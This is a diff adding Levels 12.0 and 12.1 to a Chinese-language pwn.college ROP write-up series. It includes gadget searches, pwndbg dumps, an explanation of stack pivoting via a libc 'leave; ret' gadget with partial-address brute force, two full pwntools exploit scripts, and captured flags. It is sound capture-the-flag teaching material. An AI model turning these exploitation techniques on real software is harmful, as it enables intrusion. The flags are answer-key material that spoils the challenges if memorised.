@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: Program Security (Return Oriented Programming) series"
 pubDate: "2025-01-19 13:34"
-modDate: "2025-01-21 23:59"
+modDate: "2025-01-22 17:55"
 categories:
   - "Pwn"
   - "Write-ups"
@@ -3804,3 +3804,392 @@ if __name__ == "__main__":
 ### Flag
 
 Flag: `pwn.college{oSzRHWf3oNfOmzKglfN7pBOGmyY.0lM2MDL5cTNxgzW}`
+
+## Level 12.0
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Creatively apply stack pivoting to call the win function.
+
+### Write-up
+
+~_根据 Description，我们可以推测出 CuB3y0nd 是一位非常有 Creativity 的 Hacker，直接复用 [Level 10](#level-10) 的 exp 秒了 [Level 11](#level-11) 和 [Level 12](#level-12)。每道题修改 exp 不超过 4 bytes_~
+
+写完一看 WTF! 这次 exp 跑了那么久没跑通……BRO MAKES ME SO MAD……~_你一定没看见上面那句话吧，你肯定看不见……_~
+
+让我看看到底是怎么个事：
+
+```plaintext wrap=false showLineNumbers=false ins="0x000000000000171e : leave ; ret"
+λ ~/Projects/pwn.college/ ROPgadget --binary babyrop_level12.0 --re "leave"
+Gadgets information
+============================================================
+0x00000000000022b2 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
+0x00000000000022b4 : add byte ptr [rax], al ; leave ; ret
+0x000000000000171e : leave ; ret
+0x00000000000022b1 : mov eax, 0 ; leave ; ret
+0x000000000000178b : nop ; leave ; ret
+
+Unique gadgets found: 5
+```
+
+```asm wrap=false showLineNumbers=false collapse={2-20, 28-53}
+Breakpoint 1, 0x00005978a812a2b7 in main ()
+------- tip of the day (disable with set show-tips off) -------
+Use the spray command to spray memory with cyclic pattern or specified value
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
+ RAX  0
+ RBX  0x7ffe6ec57aa8 —▸ 0x7ffe6ec58633 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level12.0'
+ RCX  0x7e9cf1d1b7a4 (write+20) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  0
+ RDI  0x7e9cf1df8710 ◂— 0
+ RSI  0x7e9cf1df7643 (_IO_2_1_stdout_+131) ◂— 0xdf8710000000000a /* '\n' */
+ R8   0x78
+ R9   0xfffffff2
+ R10  0
+ R11  0x202
+ R12  1
+ R13  0
+ R14  0x7e9cf25ef000 (_rtld_global) —▸ 0x7e9cf25f02e0 —▸ 0x5978a8128000 ◂— 0x10102464c457f
+ R15  0
+ RBP  0x7ffe6ec57a20 —▸ 0x7ffe6ec57a80 ◂— 0
+ RSP  0x7ffe6ec57988 —▸ 0x7e9cf1c34e08 ◂— mov edi, eax
+ RIP  0x5978a812a2b7 (main+912) ◂— ret
+────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
+ ► 0x5978a812a2b7 <main+912>    ret                                <0x7e9cf1c34e08>
+    ↓
+   0x7e9cf1c34e08               mov    edi, eax     EDI => 0
+   0x7e9cf1c34e0a               call   exit                        <exit>
+
+   0x7e9cf1c34e0f               call   0x7e9cf1c9ffa0              <0x7e9cf1c9ffa0>
+
+   0x7e9cf1c34e14               lock sub dword ptr [rip + 0x1c12b4], 1
+   0x7e9cf1c34e1c               je     0x7e9cf1c34e38              <0x7e9cf1c34e38>
+
+   0x7e9cf1c34e1e               mov    edx, 0x3c                   EDX => 0x3c
+   0x7e9cf1c34e23               nop    word ptr cs:[rax + rax]
+   0x7e9cf1c34e2e               nop
+   0x7e9cf1c34e30               xor    edi, edi                    EDI => 0
+   0x7e9cf1c34e32               mov    eax, edx
+─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffe6ec57988 —▸ 0x7e9cf1c34e08 ◂— mov edi, eax
+01:0008│-090 0x7ffe6ec57990 —▸ 0x7ffe6ec579d0 —▸ 0x7e9cf25ef000 (_rtld_global) —▸ 0x7e9cf25f02e0 —▸ 0x5978a8128000 ◂— ...
+02:0010│-088 0x7ffe6ec57998 —▸ 0x7ffe6ec57aa8 —▸ 0x7ffe6ec58633 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level12.0'
+03:0018│-080 0x7ffe6ec579a0 ◂— 0x1a8128040
+04:0020│-078 0x7ffe6ec579a8 —▸ 0x5978a8129f27 (main) ◂— endbr64
+05:0028│-070 0x7ffe6ec579b0 —▸ 0x7ffe6ec57aa8 —▸ 0x7ffe6ec58633 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level12.0'
+06:0030│-068 0x7ffe6ec579b8 ◂— 0xedc16b49efc02286
+07:0038│-060 0x7ffe6ec579c0 ◂— 1
+───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x5978a812a2b7 main+912
+   1   0x7e9cf1c34e08
+   2   0x7e9cf1c34ecc __libc_start_main+140
+   3   0x5978a812926e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> vmmap 0x7e9cf1c34e08
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+             Start                End Perm     Size Offset File
+    0x7e9cf1c0f000     0x7e9cf1c33000 r--p    24000      0 /usr/lib/libc.so.6
+►   0x7e9cf1c33000     0x7e9cf1da4000 r-xp   171000  24000 /usr/lib/libc.so.6 +0x1e08
+    0x7e9cf1da4000     0x7e9cf1df2000 r--p    4e000 195000 /usr/lib/libc.so.6
+pwndbg> x/2i 0x7e9cf1c3471e
+   0x7e9cf1c3471e: mov    eax,DWORD PTR [rbp-0x38]
+   0x7e9cf1c34721: sub    rax,QWORD PTR fs:0x28
+pwndbg>
+```
+
+难怪打不通，原来是因为这个 Level 没有 `challenge` 函数了，这个 Level 只有一个 `main` 函数，所以会返回到 `libc` 中。而之前有 `challenge` 函数的时候会返回到 `main`，所以我们才可以用 binary 的 `gadgets`，但这次返回到 `libc` 了自然就不能用 binary 的 gadgets 了，必须找 `libc` 中可用的 gadgets。
+
+```plaintext wrap=false showLineNumbers=false ins="0x000000000002556a : leave ; ret"
+λ ~/Projects/pwn.college/ ROPgadget --binary /usr/lib/libc.so.6 --re "leave" --depth=3
+Gadgets information
+============================================================
+  <snip>
+0x0000000000026042 : leave ; jmp rax
+0x0000000000188253 : leave ; jmp rcx
+0x00000000000fe0c8 : leave ; notrack jmp rcx
+0x000000000002556a : leave ; ret
+0x00000000000ea14b : leave ; retf
+0x000000000003bcee : movq mm0, mm2 ; leave ; ret
+0x0000000000040f4e : pop rax ; leave ; ret
+  <snip>
+
+Unique gadgets found: 190
+```
+
+```asm wrap=false showLineNumbers=false
+pwndbg> vmmap
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+             Start                End Perm     Size Offset File
+    0x5978a8128000     0x5978a8129000 r--p     1000      0 /home/cub3y0nd/Projects/pwn.college/babyrop_level12.0
+    0x5978a8129000     0x5978a812b000 r-xp     2000   1000 /home/cub3y0nd/Projects/pwn.college/babyrop_level12.0
+    0x5978a812b000     0x5978a812c000 r--p     1000   3000 /home/cub3y0nd/Projects/pwn.college/babyrop_level12.0
+    0x5978a812c000     0x5978a812d000 r--p     1000   3000 /home/cub3y0nd/Projects/pwn.college/babyrop_level12.0
+    0x5978a812d000     0x5978a812e000 rw-p     1000   4000 /home/cub3y0nd/Projects/pwn.college/babyrop_level12.0
+    0x7e9cf1c0f000     0x7e9cf1c33000 r--p    24000      0 /usr/lib/libc.so.6
+    0x7e9cf1c33000     0x7e9cf1da4000 r-xp   171000  24000 /usr/lib/libc.so.6
+    0x7e9cf1da4000     0x7e9cf1df2000 r--p    4e000 195000 /usr/lib/libc.so.6
+    0x7e9cf1df2000     0x7e9cf1df6000 r--p     4000 1e3000 /usr/lib/libc.so.6
+    0x7e9cf1df6000     0x7e9cf1df8000 rw-p     2000 1e7000 /usr/lib/libc.so.6
+    0x7e9cf1df8000     0x7e9cf1e00000 rw-p     8000      0 [anon_7e9cf1df8]
+    0x7e9cf1e00000     0x7e9cf1e07000 r--p     7000      0 /usr/lib/libcapstone.so.5
+    0x7e9cf1e07000     0x7e9cf1edd000 r-xp    d6000   7000 /usr/lib/libcapstone.so.5
+    0x7e9cf1edd000     0x7e9cf23b3000 r--p   4d6000  dd000 /usr/lib/libcapstone.so.5
+    0x7e9cf23b3000     0x7e9cf24f5000 r--p   142000 5b3000 /usr/lib/libcapstone.so.5
+
+    0x7e9cf24f5000     0x7e9cf24f6000 rw-p     1000 6f5000 /usr/lib/libcapstone.so.5
+    0x7e9cf2585000     0x7e9cf258a000 rw-p     5000      0 [anon_7e9cf2585]
+    0x7e9cf25b2000     0x7e9cf25b3000 r-xp     1000      0 [anon_7e9cf25b2]
+    0x7e9cf25b3000     0x7e9cf25b7000 r--p     4000      0 [vvar]
+    0x7e9cf25b7000     0x7e9cf25b9000 r-xp     2000      0 [vdso]
+    0x7e9cf25b9000     0x7e9cf25ba000 r--p     1000      0 /usr/lib/ld-linux-x86-64.so.2
+    0x7e9cf25ba000     0x7e9cf25e3000 r-xp    29000   1000 /usr/lib/ld-linux-x86-64.so.2
+    0x7e9cf25e3000     0x7e9cf25ed000 r--p     a000  2a000 /usr/lib/ld-linux-x86-64.so.2
+    0x7e9cf25ed000     0x7e9cf25ef000 r--p     2000  34000 /usr/lib/ld-linux-x86-64.so.2
+    0x7e9cf25ef000     0x7e9cf25f1000 rw-p     2000  36000 /usr/lib/ld-linux-x86-64.so.2
+    0x7ffe6ec38000     0x7ffe6ec59000 rw-p    21000      0 [stack]
+0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
+pwndbg> x/2i 0x7e9cf1c0f000+0x000000000002556a
+   0x7e9cf1c3456a <warn+185>: leave
+   0x7e9cf1c3456b <warn+186>: ret
+pwndbg>
+```
+
+嗯……理论上我们爆破 5 nibbles 必定可以成功，但实际上我们很幸运，在默认返回地址附近存在可用的 gadgets 来实现栈迁移，所以最终我们只需爆破 3 nibbles 就好了。
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import (
+    ELF,
+    context,
+    flat,
+    gdb,
+    log,
+    process,
+    random,
+    remote,
+)
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyrop_level12.0"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+b *main+912
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        global elf
+
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def send_payload(target, payload):
+    try:
+        target.send(payload)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def random_nibbles():
+    return random.randint(0x0000, 0xFFFF).to_bytes(2, "little")
+
+
+def leak(target):
+    target.recvuntil(b"located at: ")
+
+    return int(target.recv(0xE), 16)
+
+
+def construct_payload(leaked_addr):
+    padding_to_rbp = b"".ljust(0x68, b"A")
+
+    payload = padding_to_rbp
+    payload += flat(
+        leaked_addr - 0x10,
+        random_nibbles(),
+    )
+
+    return payload
+
+
+def attack(target, payload):
+    try:
+        send_payload(target, payload)
+
+        response = target.recvall(timeout=3)
+
+        if b"pwn.college{" in response:
+            return True
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    while True:
+        target = None
+
+        try:
+            target = launch(debug=False)
+            payload = construct_payload(leak(target))
+
+            if attack(target, payload):
+                exit()
+        except Exception as e:
+            log.exception(f"An error occurred in main: {e}")
+        finally:
+            if target is not None:
+                target.close()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{Yq8SiIRAxHtJeQWDahvT9Q5y0pE.01M2MDL5cTNxgzW}`
+
+## Level 12.1
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Creatively apply stack pivoting to call the win function.
+
+### Write-up
+
+参见 [Level 12.0](#level-120)。
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import (
+    ELF,
+    context,
+    flat,
+    gdb,
+    log,
+    process,
+    random,
+    remote,
+)
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyrop_level12.1"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        global elf
+
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def send_payload(target, payload):
+    try:
+        target.send(payload)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def random_nibbles():
+    return random.randint(0x0000, 0xFFFF).to_bytes(2, "little")
+
+
+def leak(target):
+    target.recvuntil(b"located at: ")
+
+    return int(target.recv(0xE), 16)
+
+
+def construct_payload(leaked_addr):
+    padding_to_rbp = b"".ljust(0x58, b"A")
+
+    payload = padding_to_rbp
+    payload += flat(
+        leaked_addr - 0x10,
+        random_nibbles(),
+    )
+
+    return payload
+
+
+def attack(target, payload):
+    try:
+        send_payload(target, payload)
+
+        response = target.recvall(timeout=3)
+
+        if b"pwn.college{" in response:
+            return True
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    while True:
+        target = None
+
+        try:
+            target = launch(debug=False)
+            payload = construct_payload(leak(target))
+
+            if attack(target, payload):
+                exit()
+        except Exception as e:
+            log.exception(f"An error occurred in main: {e}")
+        finally:
+            if target is not None:
+                target.close()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{4358dHEnXGJJC945avk1i2By5c6.0FN2MDL5cTNxgzW}`
